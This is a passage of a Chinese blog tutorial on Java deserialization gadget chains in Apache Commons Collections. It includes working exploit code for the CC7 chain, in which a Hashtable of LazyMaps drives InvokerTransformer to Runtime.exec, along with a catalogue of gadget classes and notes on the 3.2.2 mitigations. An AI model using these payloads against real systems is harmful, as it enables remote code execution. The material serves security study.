+<h3 id="细节4-如何不在构造的时候触发链子"><a href="#细节4-如何不在构造的时候触发链子" class="headerlink" title="细节4 如何不在构造的时候触发链子"></a>细节4 如何不在构造的时候触发链子</h3><p>因利用反射直接addEntry，这个也是put代码最后部分的操作逻辑<br>这里的Entry（也叫tab）大概是这样的<br>比如说原来的tab[0]假设有值，那么执行结果就是tab[0] 第一个元素-&gt;第二个元素 这个可以理解为是一个队列，先进入队列的先拿<br>如果tab[1]没有值，那就变成 tab[0] 第一个元素 tab[1] 第二个元素,拿的时候先拿tab[1]再拿tab[0]<br>hashtable实现的逻辑应该是这样<br>从index最大的往最小的遍历，然后获取tab[index],在从队列的头部取，直到null<br>比如说tab[3] tab[2] tab[0]<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699089552625-f36c652c-16ea-45a4-b847-a0ba756f8d57.png#averageHue=%2326282c&clientId=uc7c77b65-848a-4&from=drop&id=u563b4cf1&originHeight=278&originWidth=1020&originalType=binary&ratio=2&rotation=0&showTitle=false&size=178278&status=done&style=none&taskId=u2e4d5182-f639-4f22-9ad9-63e152183bc&title=" alt="截屏2023-11-04 17.19.08.png"><br>所以index不纠结随便写，tab默认长度是11，比11小即可,01234随便选</p>
+<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">        ConstantTransformer constantTransformer=<span class="built_in">new</span> ConstantTransformer(Runtime.class);</span><br><span class="line">        InvokerTransformer getMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class,Class[].class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,null&#125;);</span><br><span class="line">        InvokerTransformer invokeMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="built_in">new</span> Class[]&#123;Object.class,Object[].class&#125;, <span class="built_in">new</span> Object[]&#123;null,null&#125;);</span><br><span class="line">        InvokerTransformer execMethod = <span class="built_in">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="built_in">new</span> Class[]&#123;String.class&#125;, <span class="built_in">new</span> Object[]&#123;<span class="string">&quot;code&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers=<span class="built_in">new</span> Transformer[]&#123;constantTransformer,getMethod,invokeMethod,execMethod&#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="built_in">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map decorate = LazyMap.decorate(<span class="built_in">new</span> HashMap(), chainedTransformer);</span><br><span class="line">        Map decorate2 = LazyMap.decorate(<span class="built_in">new</span> HashMap(),chainedTransformer );</span><br><span class="line">        decorate.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        decorate2.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashtable = <span class="built_in">new</span> Hashtable&lt;&gt;();</span><br><span class="line"><span class="comment">//        hashtable.put(decorate,&quot;a&quot;); 可以put也可以不put</span></span><br><span class="line">        Method addEntry = hashtable.getClass().getDeclaredMethod(<span class="string">&quot;addEntry&quot;</span>, <span class="built_in">new</span> Class[]&#123;<span class="type">int</span>.class, Object.class, Object.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">        addEntry.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        addEntry.invoke(hashtable,<span class="built_in">new</span> Object[]&#123;decorate2.hashCode(),decorate2,<span class="string">&quot;a&quot;</span>,<span class="number">0</span>&#125;);</span><br><span class="line">        addEntry.invoke(hashtable,<span class="built_in">new</span> Object[]&#123;decorate.hashCode(),decorate,<span class="string">&quot;a&quot;</span>,<span class="number">6</span>&#125;);<span class="comment">//index随便写</span></span><br><span class="line">        serialize(hashtable);</span><br></pre></td></tr></table></figure>
+<h2 id="写错的反射代码"><a href="#写错的反射代码" class="headerlink" title="写错的反射代码"></a>写错的反射代码</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; hashtableEntry = Class.forName(<span class="string">&quot;java.util.Hashtable$Entry&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; declaredConstructor = hashtableEntry.getDeclaredConstructor(<span class="built_in">new</span> Class[]&#123;<span class="type">int</span>.class, Object.class, Object.class, hashtableEntry&#125;);</span><br><span class="line">declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Map.Entry o = (Map.Entry) declaredConstructor.newInstance(<span class="number">1</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>, null);</span><br><span class="line">Object[] o1 = (Object[]) Array.newInstance(hashtableEntry, <span class="number">1</span>);</span><br><span class="line">o1[<span class="number">0</span>]=o;</span><br><span class="line">Hashtable hashtable = <span class="built_in">new</span> Hashtable&lt;&gt;(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">hashtable.putAll(hashMap2);</span><br><span class="line">Field table = hashtable.getClass().getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">table.set(hashtable,o1 );</span><br></pre></td></tr></table></figure>
+<h2 id="小trick"><a href="#小trick" class="headerlink" title="小trick"></a>小trick</h2><p>Hashtable默认Entry是五个<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699084754874-c28a670e-7845-4980-bae0-804498b664fe.png#averageHue=%23393b3f&clientId=ua1e71ffd-7bfe-4&from=drop&id=u3e901ff0&originHeight=92&originWidth=558&originalType=binary&ratio=2&rotation=0&showTitle=false&size=45086&status=done&style=none&taskId=uf056eec8-f6d7-45b8-8250-3c3836dbacb&title=" alt="截屏2023-11-04 15.59.10.png"><br>下面这样写</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hashtable hashtable = <span class="built_in">new</span> Hashtable&lt;&gt;(<span class="number">2</span>,<span class="number">4</span>);</span><br></pre></td></tr></table></figure>
+<p>只有两个<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699086637647-2a677356-41d7-47fd-8477-2dacabf1e8d0.png#averageHue=%23333539&clientId=ua1e71ffd-7bfe-4&from=drop&id=u7e083fd8&originHeight=68&originWidth=522&originalType=binary&ratio=2&rotation=0&showTitle=false&size=33573&status=done&style=none&taskId=uf2126a49-c023-4131-9bb7-e2315cf4652&title=" alt="截屏2023-11-04 16.30.31.png"></p>
+<h1 id="cc链常用包和类"><a href="#cc链常用包和类" class="headerlink" title="cc链常用包和类"></a>cc链常用包和类</h1><h2 id="入口类"><a href="#入口类" class="headerlink" title="入口类"></a>入口类</h2><h3 id="readObject-compare"><a href="#readObject-compare" class="headerlink" title="readObject-&gt;compare"></a>readObject-&gt;compare</h3><h4 id="java-util-PriorityQueue"><a href="#java-util-PriorityQueue" class="headerlink" title="java.util.PriorityQueue"></a>java.util.PriorityQueue</h4><h3 id="readObject-hashCode"><a href="#readObject-hashCode" class="headerlink" title="readObject-&gt;hashCode"></a>readObject-&gt;hashCode</h3><h4 id="java-util-HashMap"><a href="#java-util-HashMap" class="headerlink" title="java.util.HashMap"></a>java.util.HashMap</h4><h3 id="readObject-toString"><a href="#readObject-toString" class="headerlink" title="readObject-&gt;toString"></a>readObject-&gt;toString</h3><h4 id="javax-management-BadAttributeValueExpException"><a href="#javax-management-BadAttributeValueExpException" class="headerlink" title="javax.management.BadAttributeValueExpException"></a>javax.management.BadAttributeValueExpException</h4><h3 id="readObject-equals"><a href="#readObject-equals" class="headerlink" title="readObject-&gt;equals"></a>readObject-&gt;equals</h3><h4 id="java-util-Hashtable"><a href="#java-util-Hashtable" class="headerlink" title="java.util.Hashtable"></a>java.util.Hashtable</h4><h2 id="中转类"><a href="#中转类" class="headerlink" title="中转类"></a>中转类</h2><h3 id="hashCode-get"><a href="#hashCode-get" class="headerlink" title="hashCode-&gt;get"></a>hashCode-&gt;get</h3><h4 id="org-apache-commons-collections-keyvalue-TiedMapEntry"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h4><h4 id="org-apache-commons-collections4-keyvalue-TiedMapEntry"><a href="#org-apache-commons-collections4-keyvalue-TiedMapEntry" class="headerlink" title="org.apache.commons.collections4.keyvalue.TiedMapEntry"></a>org.apache.commons.collections4.keyvalue.TiedMapEntry</h4><h3 id="toString-get"><a href="#toString-get" class="headerlink" title="toString-&gt;get"></a>toString-&gt;get</h3><h4 id="org-apache-commons-collections-keyvalue-TiedMapEntry-1"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry-1" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h4><h4 id="org-apache-commons-collections4-keyvalue-TiedMapEntry-1"><a href="#org-apache-commons-collections4-keyvalue-TiedMapEntry-1" class="headerlink" title="org.apache.commons.collections4.keyvalue.TiedMapEntry"></a>org.apache.commons.collections4.keyvalue.TiedMapEntry</h4><h3 id="equals-get"><a href="#equals-get" class="headerlink" title="equals-&gt;get"></a>equals-&gt;get</h3><h4 id="org-apache-commons-collections-keyvalue-TiedMapEntry-2"><a href="#org-apache-commons-collections-keyvalue-TiedMapEntry-2" class="headerlink" title="org.apache.commons.collections.keyvalue.TiedMapEntry"></a>org.apache.commons.collections.keyvalue.TiedMapEntry</h4><p>这个利用有条件,需要控制obj<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699358273737-12ee3838-aa72-43dc-b15c-ceab6f55090c.png#averageHue=%2326272a&clientId=u6e0b84fc-dbd1-4&from=drop&id=u2b98bc50&originHeight=410&originWidth=742&originalType=binary&ratio=2&rotation=0&showTitle=false&size=206923&status=done&style=none&taskId=ubf30ab29-48b2-4f47-8c35-b86c388b865&title=" alt="截屏2023-11-07 19.57.50.png"></p>
+<h4 id="org-apache-commons-collections4-keyvalue-TiedMapEntry-2"><a href="#org-apache-commons-collections4-keyvalue-TiedMapEntry-2" class="headerlink" title="org.apache.commons.collections4.keyvalue.TiedMapEntry"></a>org.apache.commons.collections4.keyvalue.TiedMapEntry</h4><p>这个同上，也要控制obj<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699358356741-3552f518-6462-439f-8644-5a07b8c50f9f.png#averageHue=%2325262a&clientId=u6e0b84fc-dbd1-4&from=drop&id=ufee2fc7f&originHeight=408&originWidth=922&originalType=binary&ratio=2&rotation=0&showTitle=false&size=247631&status=done&style=none&taskId=u20e4711c-408e-4f9e-85dd-d43a39dcead&title=" alt="截屏2023-11-07 19.59.12.png"></p>
+<h3 id="get-transform"><a href="#get-transform" class="headerlink" title="get-&gt;transform"></a>get-&gt;transform</h3><h4 id="org-apache-commons-collections-map-LazyMap"><a href="#org-apache-commons-collections-map-LazyMap" class="headerlink" title="org.apache.commons.collections.map.LazyMap"></a>org.apache.commons.collections.map.LazyMap</h4><h4 id="org-apache-commons-collections4-map-LazyMap"><a href="#org-apache-commons-collections4-map-LazyMap" class="headerlink" title="org.apache.commons.collections4.map.LazyMap"></a>org.apache.commons.collections4.map.LazyMap</h4><h4 id="org-apache-commons-collections-map-DefaultedMap"><a href="#org-apache-commons-collections-map-DefaultedMap" class="headerlink" title="org.apache.commons.collections.map.DefaultedMap"></a>org.apache.commons.collections.map.DefaultedMap</h4><h4 id="org-apache-commons-collections4-map-DefaultedMap"><a href="#org-apache-commons-collections4-map-DefaultedMap" class="headerlink" title="org.apache.commons.collections4.map.DefaultedMap"></a>org.apache.commons.collections4.map.DefaultedMap</h4><h3 id="get-put"><a href="#get-put" class="headerlink" title="get-&gt;put"></a>get-&gt;put</h3><h4 id="org-apache-commons-collections-map-LazyMap-1"><a href="#org-apache-commons-collections-map-LazyMap-1" class="headerlink" title="org.apache.commons.collections.map.LazyMap"></a>org.apache.commons.collections.map.LazyMap</h4><h4 id="org-apache-commons-collections4-map-LazyMap-1"><a href="#org-apache-commons-collections4-map-LazyMap-1" class="headerlink" title="org.apache.commons.collections4.map.LazyMap"></a>org.apache.commons.collections4.map.LazyMap</h4><h3 id="compare-transform"><a href="#compare-transform" class="headerlink" title="compare-&gt;transform"></a>compare-&gt;transform</h3><h4 id="org-apache-commons-collections4-comparators-TransformingComparator"><a href="#org-apache-commons-collections4-comparators-TransformingComparator" class="headerlink" title="org.apache.commons.collections4.comparators.TransformingComparator"></a>org.apache.commons.collections4.comparators.TransformingComparator</h4><h1 id="commons-collections-3-2-2之后的区别"><a href="#commons-collections-3-2-2之后的区别" class="headerlink" title="commons-collections 3.2.2之后的区别"></a>commons-collections 3.2.2之后的区别</h1><p>之前提到的cc链的版本都在3.2.1之前，3.2.2之后发生了一点变化</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;<span class="number">3.2</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>在3.2.2版本的时候在一些关键类里加入了writeObject和readObject<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699270229893-41cb28b4-907d-4404-a7b4-4b421a5c99b2.png#averageHue=%2327292f&clientId=u574e201a-7720-4&from=drop&id=uffcf26e1&originHeight=802&originWidth=1500&originalType=binary&ratio=2&rotation=0&showTitle=false&size=763404&status=done&style=none&taskId=uae50b5d0-ee73-40c6-9ab4-3ba1f37f307&title=" alt="截屏2023-11-06 19.29.04.png"><br>在序列化和反序列化的时候会进行安全的check<br>org.apache.commons.collections.enableUnsafeSerialization这个属性默认是null,如果是null就会报错<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699270546718-323655e4-5a8c-478b-a9a4-dde3b0110434.png#averageHue=%232b2e33&clientId=u574e201a-7720-4&from=drop&id=u3db0e3f4&originHeight=1122&originWidth=1552&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1113958&status=done&style=none&taskId=u907c9613-e5a4-4473-ac69-0386d193ea0&title=" alt="截屏2023-11-06 19.35.23.png"><br>一共有8个地方调用了这个函数，相当于3.2.2之后这8个类默认情况不能用了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/29417415/1699270622718-53b439b7-2827-49fa-8ad4-c2524a026c9a.png#averageHue=%23393d45&clientId=u574e201a-7720-4&from=drop&id=ucda1be62&originHeight=418&originWidth=776&originalType=binary&ratio=2&rotation=0&showTitle=false&size=238847&status=done&style=none&taskId=u2e048495-af0a-4bde-8f9c-64e603e232e&title=" alt="截屏2023-11-06 19.36.56.png"><br> InvokerTransformer，InstantiateTransformer，InstantiateFactory 这三个常用的被禁了</p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://azraelxuemo.github.io">azraelxuemo</a>
+            <p>Link：<a href="https://azraelxuemo.github.io/2023/11/19/CC%E9%93%BE/">https://azraelxuemo.github.io/2023/11/19/CC%E9%93%BE/</a>
+            <p>Publish date：<a href="https://azraelxuemo.github.io/2023/11/19/CC%E9%93%BE/">November 19th 2023, 10:51:34 am</a>
+            <p>Update date：<a href="https://azraelxuemo.github.io/2023/11/19/CC%E9%93%BE/">November 19th 2023, 10:40:30 am</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/11/18/%E5%BC%95%E7%94%A8%E7%BB%95%E8%BF%87/" title="java反序列化引用绕过">
+                    <div class="prevTitle">java反序列化引用绕过</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:12345@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/azraelxuemo" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">执行恶意代码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">2.1.</span> <span class="toc-text">任意方法调用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InvokerTransformer-ChainedTransformer"><span class="toc-number">2.1.1.</span> <span class="toc-text">InvokerTransformer+ChainedTransformer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD"><span class="toc-number">2.2.</span> <span class="toc-text">动态类加载</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E7%B1%BB%E5%8A%A0%E8%BD%BDdemo"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">任意类加载demo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InstantiateTransformer"><span class="toc-number">2.2.2.</span> <span class="toc-text">InstantiateTransformer</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8TrAXFilter"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">利用TrAXFilter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8InvokerTransformer"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">利用InvokerTransformer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FactoryTransformer"><span class="toc-number">2.2.3.</span> <span class="toc-text">FactoryTransformer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc1"><span class="toc-number">3.</span> <span class="toc-text">cc1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">3.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">调用流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">3.3.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%86%E8%8A%82"><span class="toc-number">3.3.1.</span> <span class="toc-text">小细节</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc6"><span class="toc-number">4.</span> <span class="toc-text">cc6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-1"><span class="toc-number">4.1.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc3"><span class="toc-number">5.</span> <span class="toc-text">cc3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-2"><span class="toc-number">5.1.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TrAXFilte"><span class="toc-number">5.1.1.</span> <span class="toc-text">TrAXFilte</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InvokerTransformer"><span class="toc-number">5.1.2.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82"><span class="toc-number">5.1.3.</span> <span class="toc-text">细节</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc4"><span class="toc-number">6.</span> <span class="toc-text">cc4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96-1"><span class="toc-number">6.1.</span> <span class="toc-text">依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E5%8C%96"><span class="toc-number">6.2.</span> <span class="toc-text">变化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-3"><span class="toc-number">6.3.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InvokerTransformer-1"><span class="toc-number">6.3.1.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InstantiateTransformer-1"><span class="toc-number">6.3.2.</span> <span class="toc-text">InstantiateTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%82-1"><span class="toc-number">6.3.3.</span> <span class="toc-text">细节</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc2"><span class="toc-number">7.</span> <span class="toc-text">cc2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8Ecc4%E5%8C%BA%E5%88%AB"><span class="toc-number">7.1.</span> <span class="toc-text">与cc4区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B-1"><span class="toc-number">7.2.</span> <span class="toc-text">调用流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-4"><span class="toc-number">7.3.</span> <span class="toc-text">exp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InvokerTransformer-2"><span class="toc-number">7.3.1.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InstantiateTransformer-2"><span class="toc-number">7.3.2.</span> <span class="toc-text">InstantiateTransformer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc5"><span class="toc-number">8.</span> <span class="toc-text">cc5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B-2"><span class="toc-number">8.1.</span> <span class="toc-text">调用流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-5"><span class="toc-number">8.2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8B%93%E5%B1%95"><span class="toc-number">8.3.</span> <span class="toc-text">拓展</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc7"><span class="toc-number">9.</span> <span class="toc-text">cc7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E7%BB%86%E8%8A%82"><span class="toc-number">9.1.</span> <span class="toc-text">构造细节</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%821-%E9%9C%80%E8%A6%81%E5%BE%80hashtable-put%E4%B8%A4%E4%B8%AAObject"><span class="toc-number">9.1.1.</span> <span class="toc-text">细节1 需要往hashtable put两个Object</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%822-%E4%B8%A4%E4%B8%AA%E4%B8%8D%E5%90%8C%E7%9A%84Object%E5%85%B7%E6%9C%89%E7%9B%B8%E5%90%8C%E7%9A%84hashcode"><span class="toc-number">9.1.2.</span> <span class="toc-text">细节2 两个不同的Object具有相同的hashcode</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Object%E4%B8%8D%E5%8F%AF%E4%BB%A5%E4%B8%80%E6%A0%B7"><span class="toc-number">9.1.2.1.</span> <span class="toc-text">Object不可以一样</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#hashcode%E8%A6%81%E4%B8%80%E6%A0%B7"><span class="toc-number">9.1.2.2.</span> <span class="toc-text">hashcode要一样</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%823-%E7%A9%B6%E7%AB%9F%E6%80%8E%E4%B9%88%E8%A7%A6%E5%8F%91%E5%88%B0get%EF%BC%88%E7%9B%B4%E6%8E%A5put%E6%97%A0%E6%B3%95%E9%81%BF%E5%85%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%97%B6%E5%80%99rce%EF%BC%89"><span class="toc-number">9.1.3.</span> <span class="toc-text">细节3 究竟怎么触发到get（直接put无法避免序列化的时候rce）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%86%E8%8A%824-%E5%A6%82%E4%BD%95%E4%B8%8D%E5%9C%A8%E6%9E%84%E9%80%A0%E7%9A%84%E6%97%B6%E5%80%99%E8%A7%A6%E5%8F%91%E9%93%BE%E5%AD%90"><span class="toc-number">9.1.4.</span> <span class="toc-text">细节4 如何不在构造的时候触发链子</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp-6"><span class="toc-number">9.2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E9%94%99%E7%9A%84%E5%8F%8D%E5%B0%84%E4%BB%A3%E7%A0%81"><span class="toc-number">9.3.</span> <span class="toc-text">写错的反射代码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8Ftrick"><span class="toc-number">9.4.</span> <span class="toc-text">小trick</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cc%E9%93%BE%E5%B8%B8%E7%94%A8%E5%8C%85%E5%92%8C%E7%B1%BB"><span class="toc-number">10.</span> <span class="toc-text">cc链常用包和类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%B1%BB"><span class="toc-number">10.1.</span> <span class="toc-text">入口类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#readObject-compare"><span class="toc-number">10.1.1.</span> <span class="toc-text">readObject-&gt;compare</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" 